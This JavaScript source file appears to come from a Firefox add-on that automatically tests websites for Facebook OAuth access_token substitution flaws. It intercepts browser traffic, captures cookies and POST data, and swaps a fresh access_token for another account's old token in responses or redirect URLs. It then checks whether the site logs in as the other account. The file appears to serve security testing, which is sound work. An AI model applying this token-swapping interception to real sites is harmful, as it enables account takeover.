var ccc = require("./ccc");
var automatedTesting = require("./automatedTesting");

const {Cc,Ci,Cr} = require("chrome");
if (typeof CCIN == "undefined") {
	function CCIN(cName, ifaceName){
		return Cc[cName].createInstance(Ci[ifaceName]);
	}
}
if (typeof CCSV == "undefined") {
	function CCSV(cName, ifaceName){
		if (Cc[cName])
			// if fbs fails to load, the error can be _CC[cName] has no properties
			return Cc[cName].getService(Ci[ifaceName]); 
		else
			dumpError("CCSV fails for cName:" + cName);
	};
}
var window = Cc["@mozilla.org/appshell/appShellService;1"].getService(Ci.nsIAppShellService).hiddenDOMWindow;
var accounts;
var inheritedPhase = 11;
var sawDialogOAuth = false;
var delayRefreshTestTabTimer = 0;
var checkLoginButtonRemovedTimer = 0;

var levenshteinDistance = function(a, b){
  if(a.length == 0) return b.length; 
  if(b.length == 0) return a.length; 
 
  var matrix = [];
 
  // increment along the first column of each row
  var i;
  for(i = 0; i <= b.length; i++){
    matrix[i] = [i];
  }
 
  // increment each column in the first row
  var j;
  for(j = 0; j <= a.length; j++){
    matrix[0][j] = j;
  }
 
  // Fill in the rest of the matrix
  for(i = 1; i <= b.length; i++){
    for(j = 1; j <= a.length; j++){
      if(b.charAt(i-1) == a.charAt(j-1)){
        matrix[i][j] = matrix[i-1][j-1];
      } else {
        matrix[i][j] = Math.min(matrix[i-1][j-1] + 1, // substitution
                                Math.min(matrix[i][j-1] + 1, // insertion
                                         matrix[i-1][j] + 1)); // deletion
      }
    }
  }
 
  return matrix[b.length][a.length];
};

var RequestRecord = function(){
	this.cookies = "";
	this.postDATA = "";
	this.url = "";
}

var ResponseRecord = function(){
	this.setCookies = "";
	this.body = "";
	this.url = "";
}

var bufferedRequests = {};					//used to store freshly captured requests
var bufferedResponses = {};
var modifiedResponseContent = "";			//used to store modified response content from testSuite.js
var displayFirstName = false;
var displayLastName = false;
var displayEmail = false;
var displayPicSRC = false;
var displayPicSRC2 = false;
var displayPicSRC3 = false;
var displayPicSRC4 = false;

if (typeof String.prototype.startsWith != 'function') {
	String.prototype.startsWith = function (str){
		return this.indexOf(str) == 0;
	};
}

var checkToken = function(storageRecord)
{
	if (!storageRecord.facebookDialogOAuthResponse) {ccc.log("Error: facebookOAuthResponse is undefined!"); return false;}
	var res = storageRecord.facebookDialogOAuthResponse.body;
	if (!ccc.usedFBSDK()) res = storageRecord.facebookDialogOAuthResponse.url;		//means the app didn't use the SDK, which means the actual redirect url is in the 302 url, as opposed to javascript content.
	ccc.log(res);
	if (typeof res == "undefined") {ccc.log("Error: facebookOAuthResponse URL/content empty!"); return false;}
	if (res.indexOf('access_token')!=-1) {
		ccc.log("Access_token exists in this traffic.");
		ccc.log("Now try to verify this exploit");
		return true;
	}
	else {
		ccc.log("Access_token NOT spotted in this traffic.");
		ccc.log(ccc.siteToTest() + " is not vulnerable, access_token not spotted.", true);
		ccc.startOver();
		automatedTesting.finishedTesting(true);
		return false;
	}
}

var verifyThreat = function(testSuiteWorker)
{
	ccc.deleteCookies();
	testSuiteWorker.port.emit("action",{"action": "navigateTo", "site":ccc.siteToTest()});
}

var checkAgainstFilter = function(url, capturingPhase)
{
	var i = 0;
	if (capturingPhase == inheritedPhase + 2 && url.indexOf("http://www.facebook.com/dialog/return")==0) 
	{
		//special situation for websites using social plugin button.php, see mapquest.com as an example.
		if (ccc.redirectDomain() != "http://static.ak.facebook.com/connect/xd_arbiter.php"){
			log("Site uses social plugin button.php, redirect domain changed to http://static.ak.facebook.com/connect/xd_arbiter.php");
			ccc.setRedirectDomain("http://static.ak.facebook.com/connect/xd_arbiter.php");
		}
		return true;
	}
	if (capturingPhase == inheritedPhase + 1)
	{
		for (i = 0; i < ccc.capturingURLs().length; i++)
		{
			if (url.startsWith(ccc.capturingURLs()[i])) {
				return true;
			}
		}
		return false;
	}
	else if (capturingPhase == inheritedPhase + 2){
		//check idp domains and excluded patterns
		for (i = 0; i < ccc.excludedPattern.length; i++)
		{
			if (url.indexOf(ccc.excludedPattern[i])!=-1) {
				return false;
			}
		}
		for (i = 0; i < ccc.IdPDomains.length; i++)
		{
			if (url.startsWith(ccc.IdPDomains[i])) {
				return true;
			}
		}
		return false;
	}
	else if (capturingPhase == inheritedPhase + 3 && ccc.usedFBSDK()){
		//check idp domains and excluded patterns
		for (i = 0; i < ccc.excludedPattern.length; i++)
		{
			if (url.indexOf(ccc.excludedPattern[i])!=-1) {
				return false;
			}
		}
		for (i = 0; i < ccc.IdPDomains.length; i++)
		{
			if (url.startsWith(ccc.IdPDomains[i])) {
				return true;
			}
		}
		return false;
	}
	else if (!ccc.usedFBSDK() && ccc.redirectDomain() != "" && capturingPhase == inheritedPhase + 3)
	{
		//we also need to account for visits to redirectDomain
		if (url.startsWith(ccc.redirectDomain())) {
			return true;
		}
	}
	else if (capturingPhase == inheritedPhase + 4)
	{
		for (; i < ccc.capturingURLs().length; i++)
		{
			if (url == ccc.capturingURLs()[i] || url.substr(0,url.length-1) == ccc.capturingURLs()[i] || url == ccc.capturingURLs()[i].substr(0, ccc.capturingURLs()[i].length-1)) {
				return true;
			}
		}
		return false;
	}
	return false;
}

function checkLoginButtonRemoved(){
	//note: the following port.on must be declared at runtime to avoid cyclic referencing.
	ccc.pressLoginButtonWorker().port.on("after_modification_sendLoginButtonInformation",  function(response){
		ccc.log("Phase "+(inheritedPhase+5).toString()+": checking login button existence after modification...");
		ccc.setCapturingPhase(ccc.capturingPhase() + 1);
		ccc.log("Current login button XPath is: " + response.loginButtonXPath);
		if (response.loginButtonXPath == ccc.loginButtonXPath() || response.loginButtonOuterHTML == ccc.loginButtonOuterHTML()) {
			ccc.log("Modification failed! After Modification the login button is still present!");
			ccc.log(ccc.siteToTest() + " is not vulnerable, login button still present after mod.", true);
			ccc.startOver();
			automatedTesting.finishedTesting(true);
			return;
		}
		ccc.log("Modification successful!, log in button different from anonymous session.");
		checkStructuralDiff();
		return;
	});
	try{
		ccc.pressLoginButtonWorker().port.emit("after_modification_sendLoginButtonInformation", {"indexToClick": ccc.indexToClick(), "tryFindInvisibleLoginButton":ccc.tryFindInvisibleLoginButton(), "account":ccc.accountsInfo()});
	} catch(ex){
		ccc.log("pressloginworker hidden frame error - likely caused by host page still loading, will try again in 10 seconds.");
		checkLoginButtonRemovedTimer = window.setTimeout(checkLoginButtonRemoved, 10000);
	}
}

function checkStructuralDiff(){
	ccc.testSuiteWorker().port.on("after_modification_extractedContent",function(response){
		//ccc.saveToFile(ccc.siteToTest(), ccc.responseTextContent()[1] + "\n---------------\n" + ccc.responseTextContent()[2] + "\n---------------\n" + response);
		//ccc.log("Phase "+(inheritedPhase+6).toString()+": Saved response content to file.");
		ccc.log("Phase "+(inheritedPhase+6).toString()+": Checking extracted content and identifying session owner...");
		modifiedResponseContent = response;
		var lowerModifiedResponseContent = modifiedResponseContent.toLowerCase();
		var accounts = ccc.accountsInfo();
		var lower1 = ccc.responseTextContent()[1].toLowerCase();
		var lower2 = ccc.responseTextContent()[2].toLowerCase();
		if (lower1.indexOf(accounts[0].firstName)!=-1&&lower2.indexOf(accounts[1].firstName)!=-1) displayFirstName = true;
		if (lower1.indexOf(accounts[0].lastName)!=-1&&lower2.indexOf(accounts[1].lastName)!=-1) displayLastName = true;
		if (lower1.indexOf(accounts[0].email)!=-1&&lower2.indexOf(accounts[1].email)!=-1) displayEmail = true;
		if (ccc.responseTextContent()[1].indexOf(accounts[0].picSRC)!=-1&&ccc.responseTextContent()[2].indexOf(accounts[1].picSRC)!=-1) displayPicSRC = true;
		if (ccc.responseTextContent()[1].indexOf(accounts[0].picSRC2)!=-1&&ccc.responseTextContent()[2].indexOf(accounts[1].picSRC2)!=-1) displayPicSRC2 = true;
		if (ccc.responseTextContent()[1].indexOf(accounts[0].picSRC3)!=-1&&ccc.responseTextContent()[2].indexOf(accounts[1].picSRC3)!=-1) displayPicSRC3 = true;
		if (ccc.responseTextContent()[1].indexOf(accounts[0].picSRC4)!=-1&&ccc.responseTextContent()[2].indexOf(accounts[1].picSRC4)!=-1) displayPicSRC4 = true;
		
		ccc.log("This website displays " + (displayFirstName ? "first name, ":"" ) + (displayLastName ? "last name, ":"" ) + (displayEmail ? "email, ":"" ) + (displayPicSRC ? "picsrc, ":"" ) + (displayPicSRC2 ? "picsrc2, ":"" ) + (displayPicSRC3 ? "picsrc3, ":"" ) + (displayPicSRC4 ? "picsrc4.":"" ));
		
		var sessionAScore = 0;
		var sessionBScore = 0;
		if (displayFirstName && lowerModifiedResponseContent.indexOf(accounts[0].firstName)!=-1) sessionAScore++;
		if (displayLastName && lowerModifiedResponseContent.indexOf(accounts[0].lastName)!=-1) sessionAScore++;
		if (displayEmail && lowerModifiedResponseContent.indexOf(accounts[0].email)!=-1) sessionAScore++;
		if (displayPicSRC && modifiedResponseContent.indexOf(accounts[0].picSRC)!=-1) sessionAScore++;
		if (displayPicSRC2 && modifiedResponseContent.indexOf(accounts[0].picSRC2)!=-1) sessionAScore++;
		if (displayPicSRC3 && modifiedResponseContent.indexOf(accounts[0].picSRC3)!=-1) sessionAScore++;
		if (displayPicSRC4 && modifiedResponseContent.indexOf(accounts[0].picSRC4)!=-1) sessionAScore++;
		
		if (displayFirstName && lowerModifiedResponseContent.indexOf(accounts[1].firstName)!=-1) sessionBScore++;
		if (displayLastName && lowerModifiedResponseContent.indexOf(accounts[1].lastName)!=-1) sessionBScore++;
		if (displayEmail && lowerModifiedResponseContent.indexOf(accounts[1].email)!=-1) sessionBScore++;
		if (displayPicSRC && modifiedResponseContent.indexOf(accounts[1].picSRC)!=-1) sessionBScore++;
		if (displayPicSRC2 && modifiedResponseContent.indexOf(accounts[1].picSRC2)!=-1) sessionBScore++;
		if (displayPicSRC3 && modifiedResponseContent.indexOf(accounts[1].picSRC3)!=-1) sessionBScore++;
		if (displayPicSRC4 && modifiedResponseContent.indexOf(accounts[1].picSRC4)!=-1) sessionBScore++;
		
		if (sessionAScore > 0 && sessionBScore == 0) {
			ccc.log("Web application now logged in as session A, threat successful, sessionAscore is: " + sessionAScore.toString());
			ccc.log(ccc.siteToTest() + " is vulnerable!", true);
			automatedTesting.finishedTesting(true);
		}
		else if (sessionBScore > 0 && sessionAScore == 0) {
			ccc.log("Web application now logged in as session B, threat failed, sessionBscore is: " + sessionBScore.toString());
			ccc.log(ccc.siteToTest() + " is not vulnerable, access_token used but session is still Bob's.", true);
			automatedTesting.finishedTesting(true);
		}
		else {
			ccc.log("Cannot determine login state, here are the scores: "+sessionAScore.toString()+ " " + sessionBScore.toString());
			ccc.log(ccc.siteToTest() + " cannot be determined (score error).", true);
			automatedTesting.finishedTesting(false);
		}
	});
	ccc.testSuiteWorker().port.emit("action",{"action":"after_modification_extractContent"});
}

function processBuffer(url)
{
	var capturingPhase = ccc.capturingPhase();
	if (capturingPhase == inheritedPhase+2 && checkAgainstFilter(url, capturingPhase) && ccc.loginButtonClicked() && sawDialogOAuth)
	{
		sawDialogOAuth = false;
		ccc.log("Phase "+(inheritedPhase+2).toString()+": Saw FB visit, waiting for access_token pattern to appear");
		ccc.setCapturingPhase(capturingPhase + 1);
	}
	if (capturingPhase == inheritedPhase+4 && checkAgainstFilter(url, capturingPhase)) {
		ccc.log("Phase "+(inheritedPhase+4).toString()+": revisited the site after access_token is modified, ready to compare credentials/differences.");
		ccc.addModifiedTokenStorageRecord(bufferedRequests[url]);
		ccc.restoreCapturingURLs();
		//ccc.saveToFile(ccc.siteToTest(), JSON.stringify(ccc.storageRecord()[ccc.siteToTest()]));
		ccc.setCapturingPhase(capturingPhase + 1);
		checkLoginButtonRemovedTimer = window.setTimeout(checkLoginButtonRemoved,10000);				//timing consistent with phase 4.
	}
}

function delayRefreshTestTab()
{
	//This function is only invoked when the site uses javascript (as opposed to reloading) to manipulate after user logs in.
	if (ccc.capturingPhase() == inheritedPhase + 4) {
		ccc.log("Sub-Phase"+(inheritedPhase+3).toString()+".5: Site probably used JS to manipulate cookies, now refresh the site and try to capture cookies");
		try {
			ccc.testSuiteWorker().port.emit("action",{"action": "navigateTo", "site":ccc.siteToTest()});
		}
		catch (ex) {
			log("testSuiteWorker worker hidden frame error, page probably still loading... retry in 10 secs");
			delayRefreshTestTabTimer = window.setTimeout(delayRefreshTestTab, 10000);
		}
	}
}

var observerService = Cc["@mozilla.org/observer-service;1"].getService(Ci.nsIObserverService);

observerService.addObserver({
    observe: function(aSubject, aTopic, aData) {
		if ("http-on-modify-request" == aTopic) {
			var gchannel = aSubject.QueryInterface(Ci.nsIHttpChannel)
			var url = gchannel.URI.spec;
			if (!checkAgainstFilter(url, ccc.capturingPhase())) return;									//this filters lots of urls.
			//--------This is the url of interest, we should start recording here--------------
			var postDATA = "";
			var cookies = "";
			var requestRecord = new RequestRecord();
			requestRecord.url = url;
			try {cookies = gchannel.getRequestHeader("cookie");} catch(e){}						//this creates lots of errors if not caught
			requestRecord.cookies = cookies;
			if (gchannel.requestMethod == "POST")
			{
				var channel = gchannel.QueryInterface(Ci.nsIUploadChannel).uploadStream;  
				var prevOffset = channel.QueryInterface(Ci.nsISeekableStream).tell();
				channel.QueryInterface(Ci.nsISeekableStream).seek(Ci.nsISeekableStream.NS_SEEK_SET, 0);  
				var stream = Cc["@mozilla.org/binaryinputstream;1"].createInstance(Ci.nsIBinaryInputStream);  
				stream.setInputStream(channel);  
				var postBytes = stream.readByteArray(stream.available());  			//this is going to mess up with POST action.
				poststr = String.fromCharCode.apply(null, postBytes);  
				
				//This is a workaround that sometimes the POST data contains Content-type and Content-length header.
				//This here may cause a bug, as we are simply discarding all \ns and get the last segment.
				var splitted = poststr.split('\n');									
				poststr = splitted[splitted.length-1];
				requestRecord.postDATA = poststr;
				
				channel.QueryInterface(Ci.nsISeekableStream).seek(Ci.nsISeekableStream.NS_SEEK_SET, prevOffset);
				//This following may alter post data.
				//var inputStream = Cc["@mozilla.org/io/string-input-stream;1"].createInstance(Ci.nsIStringInputStream);
				//inputStream.setData(poststr, poststr.length); 
				//var uploadChannel = gchannel.QueryInterface(Ci.nsIUploadChannel);
				//uploadChannel.setUploadStream(inputStream, "application/x-www-form-urlencoded", -1);
				//uploadChannel.requestMethod = "POST";
			}
			bufferedRequests[url] = requestRecord;
		}
    }
}, "http-on-modify-request", false);


function TracingListener() {
    this.originalListener = null;
	this.receivedData = [];
	this.setCookieHeader = "";
}

TracingListener.prototype =
{
    onDataAvailable: function(request, context, inputStream, offset, count)
    {
        var binaryInputStream = CCIN("@mozilla.org/binaryinputstream;1",
                "nsIBinaryInputStream");
        var storageStream = CCIN("@mozilla.org/storagestream;1", "nsIStorageStream");
        var binaryOutputStream = CCIN("@mozilla.org/binaryoutputstream;1",
                "nsIBinaryOutputStream");

        binaryInputStream.setInputStream(inputStream);
        storageStream.init(8192, count, null);
        binaryOutputStream.setOutputStream(storageStream.getOutputStream(0));

        // Copy received data as they come.
        var data = binaryInputStream.readBytes(count);
		if (ccc.usedFBSDK() && ccc.capturingPhase() == inheritedPhase + 3)
		{
			if (data.substr(0,42) == '<script type="text/javascript">var message' && data.indexOf('access_token')!=-1){
				ccc.log("Phase "+(inheritedPhase+3).toString()+": App using SDK: trying to modify access_token.");
				var head = data.substr(0, data.indexOf('access_token'));
				var tail = data.substr(data.indexOf('access_token'), data.length);
				count = count - tail.indexOf('&');
				count = count + ("access_token="+ccc.old_token()).length;
				tail = tail.substr(tail.indexOf('&'),tail.length);
				data = head + "access_token=" + ccc.old_token() + tail;
				window.setTimeout(delayRefreshTestTab,10000);
				ccc.setCapturingPhase(ccc.capturingPhase()+1);
			}
		}
        this.receivedData.push(data);
		//to modify response, modify the variable 'data' above. The next statement is going to write data into outputStream and then pass it to the next listener (and eventually the renderer).
        binaryOutputStream.writeBytes(data, count);

        this.originalListener.onDataAvailable(request, context,
            storageStream.newInputStream(0), offset, count);
    },

    onStartRequest: function(request, context) {
		var uri = request.URI.spec;
		if ((!ccc.usedFBSDK()) && uri.indexOf('access_token')!=-1)
		{
			ccc.log("Phase "+(inheritedPhase+3).toString()+": App does not use SDK: trying to modify access_token.");
			var tail = uri.substr(uri.indexOf('access_token'), uri.length);
			tail = tail.substr(tail.indexOf('&'),tail.length);
			request.URI.spec = uri.substr(0,uri.indexOf('access_token'))+"access_token="+ccc.old_token()+tail;							//redirect URI to the threat generated.
			window.setTimeout(delayRefreshTestTab,10000);
			ccc.setCapturingPhase(ccc.capturingPhase()+1);
		}
        this.originalListener.onStartRequest(request, context);
    },

    onStopRequest: function(request, context, statusCode)
    {
        // Get entire response
        var responseBody = this.receivedData.join();
		var url = request.URI.spec;										//request.URI means the current URI (after 302 redirect)
		//if (ccc.capturingPhase() == inheritedPhase+2) url = request.originalURI.spec;		//request.originalURI means the first URI (before 302 redirect)
		//For FB, oauth/dialog API is the original URI.
		//Note: originalURI at observe function (outside of this) needs to be URI, not originalURI, lol.
		if (checkAgainstFilter(url, ccc.capturingPhase()))
		{
			var responseRecord = new ResponseRecord();
			responseRecord.url = url;
			responseRecord.body = responseBody.substr(0,400);				//now only record 400 characters
			responseRecord.setCookies = this.setCookieHeader;
			bufferedResponses[url] = responseRecord;
			processBuffer(url);
		}
        this.originalListener.onStopRequest(request, context, statusCode);
    },

    QueryInterface: function (aIID) {
        if (aIID.equals(Ci.nsIStreamListener) ||
            aIID.equals(Ci.nsISupports)) {
            return this;
        }
        throw Cr.NS_NOINTERFACE;
    }
}

var httpRequestObserver =
{
    observe: function(aSubject, aTopic, aData)
    {
        if (aTopic == "http-on-examine-response")
        {
			var gchannel = aSubject.QueryInterface(Ci.nsIHttpChannel)
			var url = gchannel.URI.spec;
			if (checkAgainstFilter(url, ccc.capturingPhase())){
				if (ccc.capturingPhase() == inheritedPhase + 3 && !ccc.usedFBSDK())
				{
					//This helps tackle the 'in-between-hop' two redirects situation seen in pinterest and imgur.
					try {
						var newRedirectURI = gchannel.getResponseHeader('Location');
						var redirectDomain;
						if (newRedirectURI) redirectDomain = newRedirectURI;
						var protocol = redirectDomain.substr(0,redirectDomain.indexOf('/')) + "//";
						redirectDomain = redirectDomain.substr(redirectDomain.indexOf('/')+2,redirectDomain.length);
						redirectDomain = redirectDomain.substr(0,redirectDomain.indexOf('/'));
						redirectDomain = protocol + redirectDomain;
						ccc.setRedirectDomain(redirectDomain);
						ccc.log("Redirect Domain changed to: " + redirectDomain);
					}
					catch(ex){};
				}
				if (ccc.capturingPhase() == inheritedPhase + 4)
				{
					try {
						var newSiteToDetect = gchannel.getResponseHeader('Location');
						if (newSiteToDetect) {
							//still keep the old value so that we can restore it later.
							ccc.pushCapturingURLs(newSiteToDetect);
							ccc.log("capturingURLs appended with: " + newSiteToDetect);
						}
					}
					catch(ex){};
				}
				if (url.startsWith("https://www.facebook.com/dialog/oauth")) {
					sawDialogOAuth = true;
				}
				var newListener = new TracingListener();
				try {newListener.setCookieHeader = gchannel.getResponseHeader('Set-Cookie');} catch(ex){};		//stupid FF sliently fails if no set-cookie header is present in a response header, STUPID!  This is a workaround.
				aSubject.QueryInterface(Ci.nsITraceableChannel);
				newListener.originalListener = aSubject.setNewListener(newListener);
			}
        }
    },

    QueryInterface : function (aIID)
    {
        if (aIID.equals(Ci.nsIObserver) ||
            aIID.equals(Ci.nsISupports))
        {
            return this;
        }

        throw Cr.NS_NOINTERFACE;

    }
};

observerService.addObserver(httpRequestObserver, "http-on-examine-response", false);


exports.shouldClickLoginButton = function()
{
	if (ccc.capturingPhase()==inheritedPhase+2) return true;
}

exports.init = function()
{
	//This is executed first (entry point) of this file. Init should happen here.
	ccc.log("Control transferred to checkToken module.");
	var storageRecord = ccc.storageRecord();
	var tokenVul = checkToken(storageRecord[ccc.siteToTest()]);
	if (tokenVul)
	{
		verifyThreat(ccc.testSuiteWorker());
	}
}

exports.processLoaded = function(url)
{
	var capturingPhase = ccc.capturingPhase();
	sawDialogOAuth = false;
	if (checkAgainstFilter(url,capturingPhase)){
		ccc.log("Phase "+(inheritedPhase+1).toString()+": cleared cookies, revisited the site. Now ready to send exploit request.");
		return capturingPhase + 1;
	}
	else return capturingPhase;
}

exports.cleanup = function(){
	window.clearTimeout(delayRefreshTestTabTimer);
	window.clearTimeout(checkLoginButtonRemovedTimer);
}